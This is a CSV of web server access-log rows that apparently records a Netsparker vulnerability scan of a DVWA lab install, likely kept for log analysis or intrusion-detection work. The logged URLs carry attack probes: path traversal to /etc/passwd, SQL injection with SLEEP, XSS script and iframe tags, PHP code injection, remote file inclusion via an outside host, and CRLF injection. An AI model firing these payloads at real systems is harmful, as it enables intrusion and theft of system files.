,ip_address,remote_log_name,authenticated_user_name,timestamp,method,requesta_url,protocol,status_code,bytes_transferred,referrer_url,user_agent
5231,192.168.4.164,,,[22/Dec/2016:15:20:53 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5232,192.168.4.164,,,[22/Dec/2016:15:20:53 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5233,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/dvwa/images/?C=%20netsparker(0x0003D4)%20,HTTP/1.1,200,817,http://192.168.4.161/DVWA/dvwa/images/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5234,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/dvwa/images/?C=%22%2bnetsparker(0x0003C6)%2b%22,HTTP/1.1,200,817,http://192.168.4.161/DVWA/dvwa/images/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5235,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/dvwa/images/?C=%22%2bnetsparker(0x0003C7)%2b%22,HTTP/1.1,200,817,http://192.168.4.161/DVWA/dvwa/images/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5236,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/dvwa/images/?C=%26%2339%3b%2cnetsparker(0x0003D1)%2c%26%2339%3b,HTTP/1.1,200,817,http://192.168.4.161/DVWA/dvwa/images/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5237,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/dvwa/images/?C=%26%2339%3b%2cnetsparker(0x0003D3)%2c%26%2339%3b,HTTP/1.1,200,817,http://192.168.4.161/DVWA/dvwa/images/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5238,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/dvwa/images/?C=%27%2bnetsparker(0x0003C5)%2b%27,HTTP/1.1,200,817,http://192.168.4.161/DVWA/dvwa/images/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5239,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/dvwa/images/?C=%5c%27%3bnetsparker(0x0003CA)%3b%2f%2f%2f,HTTP/1.1,200,817,http://192.168.4.161/DVWA/dvwa/images/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5240,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/dvwa/images/?C=%5c%27%3bnetsparker(0x0003CB)%3b%2f%2f%2f,HTTP/1.1,200,817,http://192.168.4.161/DVWA/dvwa/images/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5241,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%0ans%3anetsparker056650%3dvuln,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5242,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%22%3e%3cnet%20sparker%3dnetsparker(0x0003D5)%3e,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5243,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%22%3e%3cnet%20sparker%3dnetsparker(0x0003D7)%3e,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5244,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%27%3e%3cnet%20sparker%3dnetsparker(0x0003D0)%3e,HTTP/1.1,200,1469,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5245,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%27%3e%3cnet%20sparker%3dnetsparker(0x0003D2)%3e,HTTP/1.1,200,1469,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5246,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%27%7b%24%7bprint(int)0xFFF9999-22%7d%7d%27,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5247,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%2f%2fr87.com%2f%3f,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5248,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%2f%2fr87.com%2fn%2fj%2f%3f0x0003CC,HTTP/1.1,200,1469,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5249,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%2f%2fr87.com%2fn%2fj%2f%3f0x0003CD,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5250,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%2f%2fr87.com%2fn%2fn.css%3f0x0003C8,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5251,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%2f%2fr87.com%2fn%2fn.css%3f0x0003C9,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5252,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5253,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5254,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc%2fversion%00.php,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5255,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%3c%3f%20print(int)0xFFF9999-22%3b%2f%2f%3f%3e,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5256,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%5bphp%5dprint(int)0xFFF9999-22%3b%5b%2fphp%5d,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5257,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=%7bphp%7dprint(int)0xFFF9999-22%3b%7b%2fphp%7d,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5258,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=-1%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)),HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5259,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=-1%22%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%22,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5260,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=-1%27%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%27,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5261,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=file%3a%2f%2f%2fetc%2fpasswd,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5262,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=http%3a%2f%2fr87.com%2f%3f,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5263,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=readme,HTTP/1.1,200,1451,(),"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5264,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=readme,HTTP/1.1,200,1451,hTTp://r87.com/n,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5265,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=readme,HTTP/1.1,200,1451,ns:netsparker056650=vuln,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5266,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=readme&nsextt=%0ans%3anetsparker056650%3dvuln,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5267,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/instructions.php?doc=readme&nsextt=%0d%0ans%3anetsparker056650%3dvuln,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5268,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5269,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/login.php,HTTP/1.1,200,1005,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5270,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/login.php,HTTP/1.1,200,986,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5271,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/login.php,HTTP/1.1,200,986,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5272,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],GET,/DVWA/login.php,HTTP/1.1,200,986,http://192.168.4.161/DVWA/login.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5273,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5274,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5275,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5276,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5277,192.168.4.164,,,[22/Dec/2016:15:20:54 +0300],POST,/DVWA/login.php,HTTP/1.1,302,384,http://192.168.4.161/DVWA/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5278,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/dvwa/images/?C=%0anetsparker(0x0003DA)%3b,HTTP/1.1,200,817,http://192.168.4.161/DVWA/dvwa/images/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5279,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/dvwa/images/?C=%0anetsparker(0x0003DC)%3b,HTTP/1.1,200,817,http://192.168.4.161/DVWA/dvwa/images/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5280,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/dvwa/images/?C=%20netsparker(0x0003D6)%20,HTTP/1.1,200,817,http://192.168.4.161/DVWA/dvwa/images/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5281,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/dvwa/images/?C='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0003E0)%3C/scRipt%3E,HTTP/1.1,200,817,http://192.168.4.161/DVWA/dvwa/images/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5282,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/dvwa/images/?C='%22@--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Enetsparker(0x0003E3)%3C/scRipt%3E,HTTP/1.1,200,817,http://192.168.4.161/DVWA/dvwa/images/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5283,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/dvwa/images/?C=%26%2339%3b%2bnetsparker(0x0003DE)%2b%26%2339%3b,HTTP/1.1,200,817,http://192.168.4.161/DVWA/dvwa/images/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5284,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/dvwa/images/?C=%26%2339%3b%2bnetsparker(0x0003DF)%2b%26%2339%3b,HTTP/1.1,200,817,http://192.168.4.161/DVWA/dvwa/images/,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5285,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=%22%7c%7cNETSPARKER%7c%7c,HTTP/1.1,200,1450,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5286,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5287,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=%27%2bnetsparker(0x0003ED)%2b%27,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5288,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=%27%2bnetsparker(0x0003EE)%2b%27,HTTP/1.1,200,1450,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5289,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=%2f%2f%2fr87.com%2f%3f,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5290,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=%2f%5cr87.com%2f%3f,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5291,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00.php,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5292,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=%2fetc%2fpasswd,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5293,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=%3ciframe%20src%3d%22http%3a%2f%2fr87.com%2f%3f%22%3e%3c%2fiframe%3e,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5294,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=%3cscRipt%3ens(0x0003E1)%3c%2fscRipt%3e,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5295,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=%3cscRipt%3ens(0x0003E4)%3c%2fscRipt%3e,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5296,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=*%2fnetsparker(0x0003EA)%3b%2f*,HTTP/1.1,200,1450,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5297,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=*%2fnetsparker(0x0003EB)%3b%2f*,HTTP/1.1,200,1450,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5298,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2f....%2f%2fetc%2fpasswd,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5299,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=body%7bx%3aexpression(netsparker(0x0003E8))%7d,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5300,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=body%7bx%3aexpression(netsparker(0x0003E9))%7d,HTTP/1.1,200,1450,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5301,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=data%3a%3bbase64%2cTlM3NzU0NTYxNDQ2NTc1,HTTP/1.1,200,1450,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5302,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=http://r87.com/?,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
5303,192.168.4.164,,,[22/Dec/2016:15:20:55 +0300],GET,/DVWA/instructions.php?doc=instructions.php,HTTP/1.1,200,1451,http://192.168.4.161/DVWA/instructions.php,"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36"
